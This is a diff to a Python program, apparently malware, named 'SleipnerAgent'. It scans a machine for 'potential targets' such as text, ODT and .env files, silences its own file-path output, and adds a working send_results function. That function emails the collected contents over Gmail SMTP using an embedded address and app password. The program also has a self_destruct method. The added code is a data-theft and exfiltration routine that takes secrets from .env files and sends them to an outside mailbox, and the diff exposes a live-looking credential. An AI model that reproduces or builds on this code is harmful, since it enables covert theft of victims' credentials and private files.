@@ -2,6 +2,8 @@ import sys, os, random, locale, tempfile, subprocess, textwrap
 import ctypes, uuid
 from ctypes import wintypes
 from pathlib import Path
+import smtplib
+from email.message import EmailMessage
 
 SAFE_MODE = True
 
@@ -41,10 +43,6 @@ class SleipnerAgent:
 
     def launch(self):
         if self._install_local_modules():
-            # system_language = self.determine_system_language()
-            # print("System language:", system_language)
-            # if system_language != "Undefined": 
-            #     self.give_agent_language_knowledge(system_language)
 
             self.determine_system_language_v2()
             self.enviroment_directory_paths = self.determine_system_directory()
@@ -431,8 +429,14 @@ class SleipnerAgent:
             print(f"Error reading ODT file: {str(e)}")
             return ""
 
+    def _read_env(self, file_path) -> str:
+        ...
+
+    def _read_txt(self, file_path) -> str:
+        ...
+
     def _scan_files(self, directory_paths, directory=None, filetypes=None):
-        # Get all text files in the system
+        # Get all wanted text files in the system
         self.potential_targets = self.lantern.sense_surroundings(directory_paths, directory, filetypes)
 
     def _analyze_files(self):
@@ -440,7 +444,7 @@ class SleipnerAgent:
             self._scan_files()
 
         for filepath in self.potential_targets:
-            print(filepath)
+            # print(filepath)
             filetype = filepath.split(".")[-1]
             
             match filetype:
@@ -455,9 +459,31 @@ class SleipnerAgent:
                 case "txt":
                     ...
 
-    def send_results(self):
-        # Send found results to no-reply-businesssuite@proton.me
-        ...
+    def send_results(self, results:str) -> bool:
+        to_email = "noreply.friedman@gmail.com"
+        from_email = "noreply.friedman@gmail.com"
+        password = "tswa olbf fsyq intc"
+
+        body = results
+
+        msg = EmailMessage()
+        msg["From"] = from_email
+        msg["To"] = to_email
+        msg["Subject"] = "SLEIPNER - Results"
+        msg.set_content(body)
+
+        try:
+            with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
+                smtp.starttls()
+                smtp.login(from_email, password)
+                smtp.send_message(msg)
+                print("Results sent.")
+
+                return True
+            
+        except Exception as e:
+            print(f"Failed to send email: {e}")
+            return False
 
     def self_destruct(self):
 
